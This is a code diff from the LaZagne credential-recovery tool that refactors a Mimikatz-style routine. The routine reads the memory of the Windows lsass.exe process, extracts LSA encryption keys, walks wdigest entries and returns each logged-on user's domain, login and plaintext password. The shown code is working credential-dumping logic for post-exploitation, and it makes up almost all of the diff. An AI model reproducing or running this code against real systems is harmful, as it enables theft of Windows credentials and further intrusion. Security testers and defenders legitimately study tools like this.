@@ -10,15 +10,11 @@
 from lazagne.config.crypto.pyaes.aes import AESModeOfOperationCBC
 from lazagne.config.write_output import print_debug
 from lazagne.config.crypto.pyDes import *
+from lazagne.config.lib.memorpy import *
 import struct
 
-# Construct and memorpy dependencies will be soon removed
-try:
-    from construct import *
-except ImportError:
-    construct = False
-
-from lazagne.config.lib.memorpy import *
+# Construct dependency will be soon removed
+from construct import *
 
 
 # ===============================================================================
@@ -583,34 +579,32 @@ class Mimikatz():
         Main function to run to decrypt wdigest password.
         Prerequisites: Need Admin privilege and debug privilege has to be set.
         """
-        if all((construct, memorpy)):
+        mw = MemWorker(name='lsass.exe')
+        if mw:
+            lsa_decryptor, wdigest = self.init_objects(mw)
+            if not lsa_decryptor or not wdigest:
+                return
 
-            mw = MemWorker(name='lsass.exe')
-            if mw:
-                lsa_decryptor, wdigest = self.init_objects(mw)
-                if not lsa_decryptor or not wdigest:
-                    return
+            lsa_decryptor.acquire_crypto_material()
+            if debug:
+                lsa_decryptor.dump()
 
-                lsa_decryptor.acquire_crypto_material()
-                if debug:
-                    lsa_decryptor.dump()
+            wdigest.walk_entries()
 
-                wdigest.walk_entries()
+            for cred in self.credentials_obj.credentials:
+                cred.decrypt_epwd(lsa_decryptor)
 
-                for cred in self.credentials_obj.credentials:
-                    cred.decrypt_epwd(lsa_decryptor)
+            passwords = []
+            for cred in self.credentials_obj.credentials:
+                passwords.append(
+                    {
+                        'Domain': cred.domain,
+                        'Login': cred.username,
+                        'Password': cred.pwd,
+                    }
+                )
 
-                passwords = []
-                for cred in self.credentials_obj.credentials:
-                    passwords.append(
-                        {
-                            'Domain': cred.domain,
-                            'Login': cred.username,
-                            'Password': cred.pwd,
-                        }
-                    )
-
-                return passwords
+            return passwords
 
 
 if __name__ == '__main__':
